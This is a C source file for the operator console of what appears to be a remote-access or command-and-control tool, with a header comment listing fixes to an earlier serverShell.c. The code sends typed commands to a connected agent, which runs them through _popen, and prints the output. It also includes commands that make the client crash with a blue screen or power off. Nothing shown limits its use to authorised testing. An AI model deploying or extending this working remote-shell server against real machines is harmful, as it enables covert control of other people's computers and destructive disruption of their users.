/*
 * server/prompt.c  –  Operator prompt loop implementation
 * =========================================================
 * Implements run_prompt_loop() declared in prompt.h.
 *
 * Fixes applied vs. original serverShell.c
 * -----------------------------------------
 *  FIX 1: write() sent the full 1024-byte buffer (including NUL padding).
 *          Now sends only strlen(buffer) bytes — the exact command string.
 *
 *  FIX 2: "forceOff()" strncmp comparison length was 12.
 *          "forceOff()" is 10 characters; comparing 12 reads 2 bytes past
 *          the string literal boundary.  Corrected to 10.
 *
 *  FIX 3: Dangling else — the original if/if/if/else chain attached the
 *          `else { recv() }` block only to the last `if (forceOff)`, so
 *          after sending "blueScreen()" the server would still call recv()
 *          and block waiting for a response that would never arrive.
 *          Replaced with an explicit if/else-if/else-if/else ladder.
 *
 *  FIX 4: write() and recv() return values were unchecked.
 *          Both are now tested; the loop breaks on error.
 *
 *  FIX 5: Unreachable jmp: label removed (was never jumped to).
 *
 *  FIX 6: Unused variable `n` removed.
 *
 *  BUG 7: Single recv() call races against TCP fragmentation.  TCP is a
 *          stream protocol — a single logical response may arrive in multiple
 *          recv() calls, or multiple responses may be coalesced into one.
 *          The legacy plain-socket server has no length framing, so the
 *          safest heuristic for interactive use is: read in a tight loop
 *          with a short SO_RCVTIMEO timeout and stop when the socket goes
 *          quiet.  This is not a perfect protocol but it matches what
 *          the client sends (one _popen output per command) for interactive
 *          one-liner shells.
 *
 *          For production use the server should implement the same
 *          uint32-BE length framing as the TLS layer (see tls_client.c).
 *          The legacy serverShell.c/server/ pair intentionally omit TLS
 *          and are kept for development/testing only.
 */

#include "prompt.h"
#include "config.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/* Write all bytes in buf to fd, retrying on short writes (EINTR / partial).
 * Returns 0 on success, -1 on hard error (EPIPE, ECONNRESET, etc.).       */
static int write_all(int fd, const char *buf, size_t n)
{
    size_t sent = 0;
    while (sent < n) {
        ssize_t w = write(fd, buf + sent, n - sent);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        sent += (size_t)w;
    }
    return 0;
}

/* Helper: read the full response from the client into buf[0..RESP_BUF_SIZE-1].
 * Returns the total number of bytes received, or -1 on hard error.
 * Uses a 200 ms receive timeout to detect end-of-response.                   */
static ssize_t recv_full(int fd, char *buf, size_t bufsz)
{
    /* Set a short receive timeout so we stop blocking when the client has
     * finished sending its response for this command.                         */
    struct timeval tv;
    tv.tv_sec  = 0;
    tv.tv_usec = 200 * 1000;  /* 200 ms */
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    size_t total = 0;
    while (total < bufsz - 1) {
        ssize_t n = recv(fd, buf + total, bufsz - 1 - total, 0);
        if (n > 0) {
            total += (size_t)n;
        } else if (n == 0) {
            /* Peer closed connection */
            if (total == 0) return -1;
            break;
        } else {
            /* EAGAIN / EWOULDBLOCK from the timeout — no more data */
            break;
        }
    }

    /* Remove the timeout so future write() calls are not affected */
    tv.tv_sec = tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    return (ssize_t)total;
}

void run_prompt_loop(int clientFd, const struct sockaddr_in *clientAddr)
{
    char    buffer[CMD_BUF_SIZE];
    char    cResp[RESP_BUF_SIZE];

    while (1) {
        memset(buffer, 0, sizeof(buffer));
        memset(cResp,  0, sizeof(cResp));

        /* Print the operator prompt: <client_ip>~$: */
        printf("%s~$: ", inet_ntoa(clientAddr->sin_addr));
        fflush(stdout);

        /* Read a command from stdin; break on EOF */
        if (fgets(buffer, sizeof(buffer), stdin) == NULL) break;
        strtok(buffer, "\n");  /* strip the trailing newline */

        /* FIX 1: send only the actual command bytes, not the whole buffer */
        size_t cmdLen = strlen(buffer);
        if (cmdLen == 0) continue;

        /* FIX 10: use write_all() so a partial write does not silently
         * truncate the command sent to the agent.                           */
        if (write_all(clientFd, buffer, cmdLen) < 0) {
            perror("write");
            break;
        }

        /* ── Command dispatch ───────────────────────────────────────────
         * FIX 3: explicit if/else-if ladder so every branch is unambiguous.
         * Commands that do not produce a response (q, blueScreen, forceOff)
         * must NOT call recv() — the client exits without sending anything.
         * ─────────────────────────────────────────────────────────────── */

        /* "q" is exactly one character; require cmdLen == 1.              */
        if (cmdLen == 1 && buffer[0] == 'q') {
            /* Clean disconnect — client will close */
            break;
        }
        else if (strncmp("blueScreen()", buffer, 12) == 0) {
            /* Client triggers BSOD — no response expected */
            break;
        }
        else if (strncmp("forceOff()", buffer, 10) == 0) { /* FIX 2: was 12 */
            /* Client powers off — no response expected */
            break;
        }
        else {
            /* BUG 7: use recv_full() instead of a bare recv() */
            ssize_t nRecv = recv_full(clientFd, cResp, sizeof(cResp));
            if (nRecv <= 0) {
                if (nRecv < 0) perror("recv");
                break;
            }
            cResp[nRecv] = '\0';
            printf("%s\n", cResp);
        }
    }
}
